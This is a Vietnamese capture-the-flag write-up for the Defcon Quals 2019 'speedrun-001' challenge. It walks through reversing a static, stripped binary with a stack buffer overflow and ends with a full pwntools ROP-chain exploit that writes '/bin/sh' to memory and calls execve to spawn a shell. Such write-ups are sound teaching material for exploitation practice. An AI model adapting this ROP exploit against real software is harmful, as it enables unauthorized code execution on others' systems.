# Defcon Quals 2019 Speedrun1

Dùng file và checksec kiểm tra:

```
$	file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped

$	checksec speedrun-001 
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

File 64bits, liên kết tĩnh và quan trọng là stripped, điều này khiến chúng ta không thể debug 1 cách bình thường trong gdb  
NX được bật -> không thể dùng ret2shellcode  
Pie tắt  
Chạy thử:

```
$	./speedrun-001
Hello brave new challenger
Any last words?
abc
This will be the last thing that you say: abc

Alas, you had no luck today.
```

Mở ghidra, lần theo defined string "Any last words?" tìm thấy 1 hàm:

```
void FUN_00400b60(void)

{
  undefined local_408 [1024];
  
  FUN_00410390("Any last words?");
  FUN_004498a0(0,local_408,2000);
  FUN_0040f710("This will be the last thing that you say: %s\n",local_408);
  return;
}
```

Dựa theo lần chạy thử biết hàm FUN_004498a0 dùng để nhận input, đoán 2000 là số ký tự có thể nhận. Nếu dự đoán này đúng, chúng ta có lỗi buffer overflow  
Xem hàm FUN_004498a0:

```
undefined8 FUN_004498a0(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined4 uVar1;
  
  if (DAT_006bc80c == 0) {
    syscall();
    return 0;
  }
  uVar1 = FUN_0044be40();
  syscall();
  FUN_0044bea0(uVar1,param_2,param_3);
  return 0;
}
```

Để ý hàm syscall, nhìn sang mã asm:

```
xor eax, eax
syscall
```

Theo linux syscall reference, rax bằng 0 tương đương lệnh read, đây là cách chương trình nhận input  
Tính số ký tự cần nhập trước lệnh ret:

```
gef➤  r
Starting program: /home/kali/Documents/ctf_prac/pwn/speedrun-001 
Hello brave new challenger
Any last words?
abc

Breakpoint 1, 0x0000000000400b90 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x4               
$rbx   : 0x0000000000400400  →   sub rsp, 0x8
$rcx   : 0x00000000004498ae  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x7d0             
$rsp   : 0x00007fffffffd910  →  0x000000000a636261 ("abc\n"?)
$rbp   : 0x00007fffffffdd10  →  0x00007fffffffdd30  →  0x0000000000401900  →   push r15
$rsi   : 0x00007fffffffd910  →  0x000000000a636261 ("abc\n"?)
$rdi   : 0x0               
$rip   : 0x0000000000400b90  →   lea rax, [rbp-0x400]
$r8    : 0xf               
$r9    : 0x00000000006bd880  →  0x00000000006bd880  →  [loop detected]
$r10   : 0x1               
$r11   : 0x246             
$r12   : 0x00000000004019a0  →   push rbp
$r13   : 0x0               
$r14   : 0x00000000006b9018  →  0x0000000000440ea0  →   mov rcx, rsi
$r15   : 0x0               
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd910│+0x0000: 0x000000000a636261 ("abc\n"?)        ← $rsp, $rsi
0x00007fffffffd918│+0x0008: 0x0000000000000000
0x00007fffffffd920│+0x0010: 0x0000000000000000
0x00007fffffffd928│+0x0018: 0x0000000000000000
0x00007fffffffd930│+0x0020: 0x0000000000000000
0x00007fffffffd938│+0x0028: 0x0000000000000000
0x00007fffffffd940│+0x0030: 0x0000000000000000
0x00007fffffffd948│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400b83                  mov    rsi, rax
     0x400b86                  mov    edi, 0x0
     0x400b8b                  call   0x4498a0
●→   0x400b90                  lea    rax, [rbp-0x400]
     0x400b97                  mov    rsi, rax
     0x400b9a                  lea    rdi, [rip+0x919b7]        # 0x492558
     0x400ba1                  mov    eax, 0x0
     0x400ba6                  call   0x40f710
     0x400bab                  nop    
────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-001", stopped 0x400b90 in ?? (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400b90 → lea rax, [rbp-0x400]
[#1] 0x400c1d → mov eax, 0x0
[#2] 0x4011a9 → mov edi, eax
[#3] 0x400a5a → hlt 
───────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fffffffdd20:
 rip = 0x400b90; saved rip = 0x400c1d
 called by frame at 0x7fffffffdd40
 Arglist at 0x7fffffffd908, args: 
 Locals at 0x7fffffffd908, Previous frame's sp is 0x7fffffffdd20
 Saved registers:
  rbp at 0x7fffffffdd10, rip at 0x7fffffffdd18
```

Số ký tự cần nhập trước ret = 0x7fffffffdd18 - 0x00007fffffffd910 = 0x408 = 1032  
Ý tưởng khai thác: sử dụng kỹ thuật ROPchain lấy shell  
Tìm 1 chỗ lưu chuỗi "/bin/sh/0":

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/Documents/ctf_prac/pwn/speedrun-001                                                       
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/Documents/ctf_prac/pwn/speedrun-001
0x00000000006bc000 0x00000000006bd000 0x0000000000000000 rw- [heap]
0x00000000006bd000 0x00000000006e0000 0x0000000000000000 rw- [heap]
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

x/10xg 0x00000000006b6000
0x6b6000:       0x0000000000000000      0x0000000000000000
0x6b6010:       0x0000000000000000      0x0000000000000000
0x6b6020:       0x0000000000000000      0x0000000000000000
0x6b6030:       0x0000000000000000      0x0000000000000000
0x6b6040:       0x0000000000000000      0x0000000000000000
```

Vùng nhớ từ 0x6b6000 tới 0x6bc000 đủ tốt để ghi do ta có quyền write, đồng thời PIE không được bật và không có dữ liệu được chứa trong đó  
Tìm cách để ghi: có thể sử dụng cách mà chương trình đã dùng để nhận input

```
sys_read:
rax: 0x00 : mã lệnh sys_read
rdi: 0 : file description
rsi: 0x6b6000 : char *buf
rdx: 8 : "/bin/sh" size
```

Sử dụng ROPgadget tìm các gadget ta cần:
```
$	ROPgadget --binary speedrun-001 | grep "pop rax ; ret"
0x0000000000415662 : add ch, al ; pop rax ; ret
0x0000000000415661 : cli ; add ch, al ; pop rax ; ret
0x00000000004a9321 : in al, 0x4c ; pop rax ; retf
0x0000000000415664 : pop rax ; ret
0x000000000048cccb : pop rax ; ret 0x22
0x00000000004a9323 : pop rax ; retf
0x00000000004758a3 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
$	ROPgadget --binary speedrun-001 | grep "pop rdi ; ret"
0x0000000000423788 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; pop rdi ; ret
0x000000000042378b : fsubp st(0) ; pop rdi ; ret
0x0000000000400686 : pop rdi ; ret
$	ROPgadget --binary speedrun-001 | grep "pop rsi ; ret"
0x000000000046759d : add byte ptr [rbp + rcx*4 + 0x35], cl ; pop rsi ; ret
0x000000000048ac68 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x000000000044be39 : pop rdx ; pop rsi ; ret
0x00000000004101f3 : pop rsi ; ret
$	ROPgadget --binary speedrun-001 | grep "pop rdx ; ret"
0x00000000004a8881 : js 0x4a88fe ; pop rdx ; retf
0x000000000044be16 : pop rdx ; ret
0x000000000045fe71 : pop rdx ; retf
```

Với lệnh syscall, ta sẽ dùng công cụ ropper do ROPgadget không hỗ trợ

```
$	ropper --file speedrun-001 | grep "syscall"      
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
...
0x0000000000474e65: syscall; ret;
...
```

Vậy chúng ta lấy được 5 địa chỉ lệnh 0x415664, 0x400686, 0x4101f3, 0x44be16 và 0x474e65  
Sau khi ghi được chuỗi "/bin/sh", thực thi execve("/bin/sh"):

```
execve:
rax: 0x3b : mã lệnh execve
rdi: 0x6b6000 : char *filename
rsi: 0  
rdx: 0 
``` 

Ý tưởng đã có, giờ viết code khai thác:

```
#!/usr/bin/python3

from pwn import *

exe = ELF("./speedrun-001", checksec = False)

con = process("./speedrun-001")
#gdb.attach(con, gdbscript = 'b *0x400bad')

pop_rax = 0x0000000000415664
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004101f3
pop_rdx = 0x000000000044be16
rw_section = 0x00000000006b6000
syscall = 0x474e65

#pop rax, 0x00
#pop rdi, 0
#pop rsi, 0x6b6000
#pop rdx, 8
#syscall
payload = b'A'*1032 + p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(rw_section) + p64(pop_rdx) + p64(8) + p64(syscall)

#pop rax, 0x3b
#pop rdi, 0x6b6000
#pop rsi, 0
#pop rdx, 0
#syscall
payload += p64(pop_rax) +p64(0x3b) + p64(pop_rdi) + p64(rw_section) + p64(pop_rsi) +p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)

# Không dùng sendlineafter vì sẽ bị dính "\n" vào chuỗi "/bin/sh" 
con.sendafter(b"words?\n",payload)
con.sendlineafter(b"AAAdVA\n",b"/bin/sh\0")

con.interactive()
```

Chạy code khai thác và lấy được shell:

```
$	./demo.py      
[+] Starting local process './speedrun-001': pid 24090
[*] Switching to interactive mode
$ ls
core  demo.py  exp.py  flag.txt  pwn_wu  speedrun-001  vuln  vuln.c
```
